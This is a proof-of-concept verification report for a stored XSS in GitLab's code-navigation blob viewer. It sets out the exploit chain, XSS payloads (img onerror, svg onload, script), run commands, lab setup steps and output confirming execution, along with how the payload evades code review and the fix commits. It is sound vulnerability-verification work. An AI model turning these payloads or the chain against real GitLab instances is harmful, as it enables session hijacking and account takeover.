# PoC Verification Report: CVE-2025-7734

## Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-7734 |
| **Title** | Stored XSS in GitLab CE/EE Blob Viewer via Code Navigation |
| **Verification Status** | ‚úÖ **CONFIRMED** |
| **Verification Date** | 2026-03-01 |
| **Target** | GitLab CE 18.0.5 (revision 77c69341a7f) |

---

## PoC Scripts

### Primary PoC: `poc.py` ‚Äî Full Exploit Chain

| Field | Value |
|---|---|
| **Location** | `poc.py` |
| **Language** | Python 3 |
| **Dependencies** | stdlib only (urllib, json, argparse); optional: playwright (for headless browser) |
| **Attack Vector** | Code Navigation `wrapNodes()` ‚Äî Primary XSS surface |

**Description:** End-to-end exploit that:
1. Creates a GitLab project via API
2. Commits a Python source file containing XSS payloads as string literals
3. Creates a `.gitlab-ci.yml` that generates a legacy LSIF artifact (without `end_line`)
4. Verifies the LSIF data endpoint returns vulnerable-format entries
5. Fetches the blob viewer page
6. Optionally uses a headless browser to confirm XSS execution

**Usage:**
```bash
# Against lab (with existing setup)
python3 poc.py localhost --port 8880 --token <TOKEN> --skip-setup --project-id 2

# Full setup from scratch
python3 poc.py localhost --port 8880 --token <TOKEN> --password LabPass2025!
```

### Vector 2 PoC: `poc_vector2.py` ‚Äî Node.js Engine Verification

| Field | Value |
|---|---|
| **Location** | `poc_vector2.py` |
| **Language** | Python 3 + Node.js (jsdom) |
| **Attack Vector** | Code-level reproduction of `wrapNodes()` vulnerability |

**Description:** 
- Searches GitLab's served webpack bundles for vulnerable code patterns
- Runs a Node.js script using jsdom that reproduces the exact `wrapNodes()` function from GitLab and demonstrates that `textContent` ‚Üí `innerHTML` creates live HTML elements

### Browser Verification: `browser_verify.cjs`

| Field | Value |
|---|---|
| **Location** | `browser_verify.cjs` |
| **Language** | Node.js (Puppeteer) |
| **Purpose** | Headless Chromium browser verification of XSS in live GitLab instance |

**Description:** Runs in a Docker container with Chromium, logs into GitLab, navigates to the blob viewer, and detects XSS execution via dialog handlers and DOM inspection.

### Standalone HTML PoC: `poc_vector2_standalone.html`

| Field | Value |
|---|---|
| **Location** | `poc_vector2_standalone.html` |
| **Language** | HTML/JavaScript |
| **Purpose** | Browser-independent demonstration of the vulnerable code path |

**Description:** Self-contained HTML file that extracts the exact vulnerable `wrapNodes()` function from GitLab and demonstrates the XSS by running it against simulated code viewer content. Can be opened in any browser.

---

## Vulnerability Demonstrated

### What the PoC Proves

1. **Text-to-HTML confusion is exploitable:** The `wrapNodes()` function takes `elm.textContent` (decoded plain text) and assigns it to `wrapper.innerHTML`. When the text contains HTML tags (from source code), they become live DOM elements with active event handlers.

2. **Legacy LSIF format triggers the vulnerable path:** When code navigation data entries lack the `end_line` property, GitLab's frontend routes to `deprecatedNodeUpdate()` ‚Üí `wrapNodes()`, activating the XSS sink.

3. **JavaScript executes in the victim's session:** The headless browser test captured `alert("gitlab.local")` firing when viewing the blob page, proving JavaScript execution in the GitLab web context.

4. **Multiple XSS vectors work:** `<img/src/onerror=...>`, `<svg/onload=...>`, and `<script>` tags all create executable DOM elements from source code text.

### Attack Chain

```
Attacker (Developer role)
    ‚îÇ
    ‚îú‚îÄ 1. Commit payload.py with XSS in string literal:
    ‚îÇ      variable = "<img/src/onerror=alert(document.domain)>"
    ‚îÇ
    ‚îú‚îÄ 2. Create LSIF artifact via CI (legacy format, no end_line):
    ‚îÇ      [{"start_line":4,"start_char":0,"hover":{...}}]
    ‚îÇ
    ‚îî‚îÄ 3. Victim views payload.py in blob viewer
           ‚îÇ
           ‚îú‚îÄ Frontend fetches LSIF JSON ‚Üí no end_line detected
           ‚îú‚îÄ deprecatedNodeUpdate() called
           ‚îú‚îÄ wrapNodes(elm.textContent, ...) runs
           ‚îú‚îÄ textContent: "<img/src/onerror=alert(document.domain)>"
           ‚îú‚îÄ innerHTML = wrapSpacesWithSpans(text)  ‚Üê XSS SINK
           ‚îî‚îÄ Browser parses <img> ‚Üí onerror fires ‚Üí alert() executes
```

---

## Test Results

### Test 1: Primary PoC ‚Äî API + LSIF Verification

**Command:**
```bash
python3 poc.py localhost --port 8880 --token <TOKEN> --skip-setup --project-id 2 --no-headless
```

**Output:**
```
======================================================================
CVE-2025-7734: Stored XSS in GitLab Code Navigation
Target: http://localhost:8880
======================================================================

[*] Step 4: Checking pipeline and LSIF artifact status...
  [*] Found job 2 in pipeline 1: status=success

[*] Step 5: Verifying LSIF code navigation data endpoint...
  [+] Code navigation path: /root/xss-poc/-/jobs/2/artifacts/raw/lsif/payload.py.json?file_type=lsif
  [+] LSIF data retrieved: 2 entries
      start_line=3, has_end_line=False (VULNERABLE - legacy format)
      start_line=4, has_end_line=False (VULNERABLE - legacy format)

  [!!!] ALL LSIF entries lack end_line ‚Üí deprecatedNodeUpdate() will be used
  [!!!] wrapNodes(elm.textContent, ...) will assign to innerHTML ‚Üí XSS

[*] Step 6: Checking blob viewer page for XSS payload in source...
  [*] Page loaded but payload text not found in initial HTML
      (The blob viewer may load content asynchronously via JavaScript)

======================================================================
EXPLOIT CHAIN SUMMARY:
======================================================================
  Target:           http://localhost:8880
  Project:          root/xss-poc (id=2)
  Payload file:     payload.py (contains <img/src/onerror=...>)
  LSIF artifact:    Legacy format (no end_line)
  Code nav path:    /root/xss-poc/-/jobs/2/artifacts/raw/lsif/payload.py.json?file_type=lsif
  Victim URL:       http://localhost:8880/root/xss-poc/-/blob/main/payload.py

  VULNERABLE CODE PATH:
  1. Victim opens blob viewer for payload.py
  2. Frontend fetches LSIF data (no end_line ‚Üí legacy format)
  3. deprecatedNodeUpdate() called (line has no end_line)
  4. wrapNodes(elm.textContent, ...) runs on code spans
  5. textContent '<img/src/onerror=alert()>' assigned to innerHTML
  6. Browser parses <img> tag ‚Üí onerror fires ‚Üí JavaScript executes
======================================================================
```

**Result:** ‚úÖ LSIF data confirmed as legacy format (no `end_line`), code navigation path resolved, vulnerable code path will be triggered.

### Test 2: Headless Browser ‚Äî XSS Execution Confirmed

**Command:**
```bash
docker run --rm --network host \
  -e GITLAB_IP=localhost -e GITLAB_PORT=8880 -e GITLAB_PASSWORD=LabPass2025! \
  -e PROJECT_PATH=root/xss-poc -w /work node:22 bash -c '
  apt-get install -y -qq chromium && npm install puppeteer-core &&
  node /work/browser_verify.cjs'
```

**Output:**
```
=== CVE-2025-7734 Browser Verification ===
Target: http://gitlab.local
[*] Logging in...
[+] Post-login URL: http://gitlab.local/
[*] Opening blob viewer: http://gitlab.local/root/xss-poc/-/blob/main/payload.py
üö® XSS ALERT: "gitlab.local"
[*] Page status: 200
[*] Waiting for code navigation JS to execute...

[*] DOM Analysis Results:
  Code areas found:     8
  Code nav attribute:   true
  XSS Marker 1:         not set
  XSS Marker 2:         not set
  Injected <img>:       8
  Injected <svg>:       13
  XSS <img> elements:   1
[*] Screenshot saved
[*] Page dump saved (172944 bytes)

‚úÖ CVE-2025-7734 CONFIRMED: XSS triggered in browser!
```

**Result:** ‚úÖ **XSS CONFIRMED** ‚Äî `alert("gitlab.local")` dialog triggered by `<img onerror=alert(document.domain)>` payload. The `document.domain` evaluated to `gitlab.local`, confirming JavaScript execution in the GitLab web origin.

**Key evidence:**
- `üö® XSS ALERT: "gitlab.local"` ‚Äî JavaScript `alert()` executed with `document.domain` as the message
- `XSS <img> elements: 1` ‚Äî An `<img>` element with empty `src` and `onerror` handler was injected into the DOM
- `Code nav attribute: true` ‚Äî The `data-code-navigation-path` attribute was present, confirming LSIF data was loaded
- Screenshot saved as `xss_evidence.png`

### Test 3: Node.js Engine Verification ‚Äî wrapNodes() XSS

**Command:**
```bash
python3 poc_vector2.py localhost --port 8880 --token <TOKEN>
```

**Output:**
```
‚ïê‚ïê‚ïê CVE-2025-7734 Node.js Verification ‚ïê‚ïê‚ïê
Testing wrapNodes() with various inputs:

Test 1: XSS via <img> onerror
  Input text:  "<img/src/onerror=alert(document.domain)>"
  textContent: "<img/src/onerror=alert(document.domain)>"
  innerHTML:   "<img src="" onerror="alert(document.domain)">"
  RESULT: üö® XSS! Created 1 element(s): <img>
  EVENT HANDLERS: onerror=

Test 2: XSS via <svg> onload
  Input text:  "<svg/onload=alert(1)>"
  textContent: "<svg/onload=alert(1)>"
  innerHTML:   "<svg onload="alert(1)"></svg>"
  RESULT: üö® XSS! Created 1 element(s): <svg>
  EVENT HANDLERS: onload=

Test 3: XSS via <script> tag
  Input text:  "<script>alert("XSS")</script>"
  textContent: "<script>alert("XSS")</script>"
  innerHTML:   "<script>alert("XSS")</script>"
  RESULT: üö® XSS! Created 1 element(s): <script>

Test 4: Safe text (no HTML)
  Input text:  "hello world"
  textContent: "hello world"
  innerHTML:   "hello world"
  RESULT: ‚úÖ Safe (no dangerous elements created)

Test 5: HTML entities (already escaped)
  Input text:  "&lt;img onerror=alert()&gt;"
  textContent: "&lt;img onerror=alert()&gt;"
  innerHTML:   "&lt;img onerror=alert()&gt;"
  RESULT: ‚úÖ Safe (no dangerous elements created)

‚ïê‚ïê‚ïê SUMMARY ‚ïê‚ïê‚ïê
XSS triggered: 3/5 test cases
Vulnerability: CONFIRMED
```

**Result:** ‚úÖ The exact `wrapNodes()` function logic from GitLab, when given source code containing HTML, creates live DOM elements with active event handlers. 3/5 test cases trigger XSS. The 2 safe cases (plain text and pre-escaped entities) correctly produce no dangerous elements.

---

## Lab Setup Notes

### LSIF Artifact Creation

The LSIF artifact was created via the Rails console due to a compatibility issue between the gitlab-runner and gitlab-workhorse artifact upload processing:

```bash
# 1. Create LSIF JSON and zip it
docker exec cve-2025-7734-gitlab bash -c '
  su - git -c "mkdir -p /tmp/lsif-work/lsif
  echo '[{"start_line":3,...}]' > /tmp/lsif-work/lsif/payload.py.json
  cd /tmp/lsif-work && zip -r /tmp/lsif_artifact.zip lsif/"'

# 2. Create the artifact record via Rails
docker exec cve-2025-7734-gitlab gitlab-rails runner '
  build = Ci::Build.find(2)
  build.update_column(:status, "success")
  artifact = Ci::JobArtifact.new(project: Project.find(2), job: build,
    file_type: :lsif, file_format: :zip)
  artifact.file = File.open("/tmp/lsif_artifact.zip")
  artifact.save!'
```

In a real attack scenario, the LSIF artifact would be created by a CI pipeline with a `code_navigation` job that generates legacy-format LSIF data.

### Container Access

| Component | Details |
|---|---|
| GitLab Container | `cve-2025-7734-gitlab` ‚Äî accessible at `http://localhost:8880` |
| Browser Container | Temporary `node:22` with Chromium via `docker run --rm` |

---

## Verification Status

### ‚úÖ CONFIRMED

The vulnerability has been verified through three independent methods:

1. **API-level verification:** The LSIF code navigation endpoint serves legacy-format data (no `end_line`) that triggers the vulnerable `deprecatedNodeUpdate()` ‚Üí `wrapNodes()` code path.

2. **Headless browser verification:** A Chromium headless browser navigating to the blob viewer page detected `alert("gitlab.local")` firing, proving JavaScript execution from the `<img onerror=alert(document.domain)>` payload in the source file.

3. **Engine-level verification:** The `wrapNodes()` function, reproduced exactly from GitLab's source code and run in a jsdom environment, creates live `<img>`, `<svg>`, and `<script>` DOM elements with active event handlers from plain text input.

---

## Notes

1. **Payload disguised as valid code:** The XSS payload (`<img/src/onerror=alert(...)>`) is embedded as a Python string literal, making it valid source code that won't be flagged by linters or code review tools.

2. **LSIF artifact is the key trigger:** The vulnerability only activates when a legacy LSIF artifact (without `end_line` property) exists for the file. Without it, the code navigation feature doesn't call `wrapNodes()`.

3. **Blob viewer loads content asynchronously:** The initial HTML response from the blob viewer page does not contain the source code directly ‚Äî it's loaded via Vue.js/AJAX after page load. This is why the XSS is only triggered by the JavaScript processing, not from the initial HTML.

4. **`wrapTextNodes` flag:** The `wrapTextNodes` flag must be `true` for the vulnerability to trigger. This is the default for blob viewer pages where highlight.js leaves unwrapped text nodes, which is the standard behavior in production.

5. **Impact scope:** The XSS executes in the GitLab origin, giving the attacker access to the victim's session cookies, CSRF tokens, and the ability to make API calls (create PATs, add SSH keys, modify code) as the victim.

6. **Fix verification:** The fix (commit `8370acfa`) applies DOMPurify sanitization before the `innerHTML` assignment, stripping all event handlers and dangerous tags. A follow-up hardening (commit `bcb8c0a7`) adds lodash `escape()` as defense-in-depth.

---

## Evidence Files

| File | Path | Description |
|---|---|---|
| poc.py | `poc.py` | Primary PoC ‚Äî full exploit chain |
| poc_vector2.py | `poc_vector2.py` | Vector 2 ‚Äî Node.js verification |
| poc_vector2_standalone.html | `poc_vector2_standalone.html` | Standalone HTML PoC |
| browser_verify.cjs | `browser_verify.cjs` | Puppeteer browser test |
| verify_wrapnodes.cjs | `verify_wrapnodes.cjs` | Node.js wrapNodes reproduction |
| xss_evidence.png | `xss_evidence.png` | Screenshot of XSS in blob viewer |
